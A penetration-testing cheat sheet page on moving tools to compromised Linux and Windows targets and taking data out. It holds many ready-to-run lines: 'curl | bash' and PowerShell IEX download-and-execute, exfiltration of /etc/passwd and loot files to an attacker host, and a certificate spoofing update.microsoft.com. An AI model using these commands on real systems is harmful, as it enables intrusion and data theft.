---
sidebar_position: 1
title: File Transfer
---

# File Transfer Methods

Reliable file transfer is essential for moving tools to targets and exfiltrating data. Different environments restrict different protocols — always have multiple methods ready.

```bash
# Set environment variables
export TARGET=<ip>
export LHOST=<your-ip>
export LPORT=4444
```

---

## Attacker-Hosted Servers

### Python HTTP Server

The fastest way to serve files from Kali:

```bash
python3 -m http.server 80
```

Serve from a specific directory:

```bash
python3 -m http.server 80 -d /opt/tools
```

### Python HTTPS Server (Encrypted)

For environments that block HTTP or inspect traffic:

```bash
# Generate a self-signed cert
openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes -subj "/CN=update.microsoft.com"

# Serve with HTTPS
python3 -c "
import http.server, ssl
server = http.server.HTTPServer(('0.0.0.0', 443), http.server.SimpleHTTPRequestHandler)
server.socket = ssl.wrap_socket(server.socket, certfile='server.pem', server_side=True)
server.serve_forever()
"
```

### Python Upload Server

Receive files uploaded from the target:

```bash
pip install uploadserver --break-system-packages
python3 -m uploadserver 80
```

Files are saved to the current directory. Upload from target with:

```bash
curl -X POST http://$LHOST/upload -F 'files=@/etc/passwd'
```

### SMB Server (Impacket)

Host an SMB share that Windows targets can access directly:

```bash
impacket-smbserver share /opt/tools -smb2support
```

With authentication (required for some Windows configurations):

```bash
impacket-smbserver share /opt/tools -smb2support -user kali -password kali
```

### FTP Server

```bash
python3 -m pyftpdlib -p 21 -w
```

The `-w` flag allows write access (for uploading from target).

---

## Linux Target Downloads

### wget

```bash
wget http://$LHOST/file -O /tmp/file
```

### curl

```bash
curl http://$LHOST/file -o /tmp/file
```

Execute a script without writing to disk:

```bash
curl http://$LHOST/script.sh | bash
```

### Netcat

Receiver (target):

```bash
nc -nlvp 9999 > file
```

Sender (Kali):

```bash
nc -nv $TARGET 9999 < file
```

Or reverse — sender on target, receiver on Kali:

```bash
# Kali
nc -nlvp 9999 > file

# Target
nc -nv $LHOST 9999 < /etc/passwd
```

### SCP (Requires SSH Access)

```bash
scp file $USER@$TARGET:/tmp/file
scp $USER@$TARGET:/tmp/loot.txt ./loot.txt
```

### Base64 Encoding (No File Transfer Tools Available)

When no download tools exist on the target, encode the file and copy/paste:

On Kali, encode:

```bash
base64 -w 0 reverse.elf
```

On target, decode:

```bash
echo '<base64-string>' | base64 -d > reverse.elf
chmod +x reverse.elf
```

:::tip
Base64 works for any file type and doesn't require any special tools on the target — just echo and base64, which exist on virtually every Linux system.
:::

### Bash /dev/tcp (No Tools at All)

If the target has bash but no curl/wget/nc:

```bash
# Target (download from Kali)
bash -c 'cat < /dev/tcp/$LHOST/80 > /tmp/file'
```

On Kali, serve the file with netcat:

```bash
nc -nlvp 80 < file
```

### PHP Download

If PHP is available on the target:

```bash
php -r "file_put_contents('/tmp/file', file_get_contents('http://$LHOST/file'));"
```

### Perl Download

```bash
perl -e 'use File::Fetch; my $ff = File::Fetch->new(uri => "http://LHOST/file"); $ff->fetch(to => "/tmp/");'
```

---

## Windows Target Downloads

### PowerShell (Invoke-WebRequest / iwr)

```powershell
iwr -uri http://$LHOST/file.exe -OutFile C:\Users\Public\file.exe
```

Shorter alias:

```powershell
wget http://$LHOST/file.exe -OutFile file.exe
```

### PowerShell (System.Net.WebClient)

```powershell
(New-Object System.Net.WebClient).DownloadFile("http://$LHOST/file.exe","C:\Users\Public\file.exe")
```

Download and execute in memory (fileless):

```powershell
IEX (New-Object System.Net.WebClient).DownloadString("http://$LHOST/script.ps1")
```

### certutil

```powershell
certutil -urlcache -f http://$LHOST/file.exe C:\Users\Public\file.exe
```

:::warning
`certutil` downloads are commonly flagged by AV/EDR. It still works in many environments but expect detection in hardened ones.
:::

### bitsadmin

Background download using BITS (Background Intelligent Transfer Service):

```powershell
bitsadmin /transfer job /download /priority high http://$LHOST/file.exe C:\Users\Public\file.exe
```

### curl.exe (Windows 10+)

```powershell
curl.exe http://$LHOST/file.exe -o C:\Users\Public\file.exe
```

### SMB Copy

If you're running an impacket SMB server on Kali:

```powershell
copy \\$LHOST\share\file.exe C:\Users\Public\file.exe
```

Or execute directly from the share:

```powershell
\\$LHOST\share\tool.exe
```

With authenticated SMB:

```powershell
net use \\$LHOST\share /user:kali kali
copy \\$LHOST\share\file.exe C:\Users\Public\file.exe
net use \\$LHOST\share /delete
```

### FTP

Built-in Windows FTP client (interactive):

```powershell
ftp $LHOST
# binary
# get file.exe
# bye
```

Non-interactive FTP using a script file:

```powershell
echo open $LHOST > ftp.txt
echo binary >> ftp.txt
echo get file.exe >> ftp.txt
echo bye >> ftp.txt
ftp -s:ftp.txt
```

---

## Windows Target Uploads (Exfiltration)

### PowerShell Upload

Upload a file to your Python upload server:

```powershell
$body = [System.IO.File]::ReadAllBytes("C:\Users\Public\loot.txt")
Invoke-WebRequest -Uri http://$LHOST/upload -Method POST -Body $body
```

Or using Invoke-RestMethod:

```powershell
Invoke-RestMethod -Uri http://$LHOST/upload -Method POST -InFile C:\Users\Public\loot.txt
```

### Netcat Upload

Start a listener on Kali:

```bash
nc -nlvp 9999 > received_file
```

Send from the Windows target (if nc.exe is available):

```powershell
nc.exe $LHOST 9999 < C:\Users\Public\loot.txt
```

### Base64 Encoding (Copy/Paste)

On the Windows target:

```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\Public\loot.txt"))
```

Copy the output, then on Kali:

```bash
echo '<base64-string>' | base64 -d > loot.txt
```

For larger files, use certutil for encoding:

```powershell
certutil -encode C:\Users\Public\loot.txt encoded.txt
type encoded.txt
```

---

## Transfer Integrity Verification

Always verify file integrity after transfer to ensure nothing was corrupted.

On Kali (before transfer):

```bash
md5sum file.exe
sha256sum file.exe
```

On Linux target (after transfer):

```bash
md5sum /tmp/file.exe
```

On Windows target (after transfer):

```powershell
Get-FileHash C:\Users\Public\file.exe -Algorithm MD5
certutil -hashfile C:\Users\Public\file.exe MD5
```
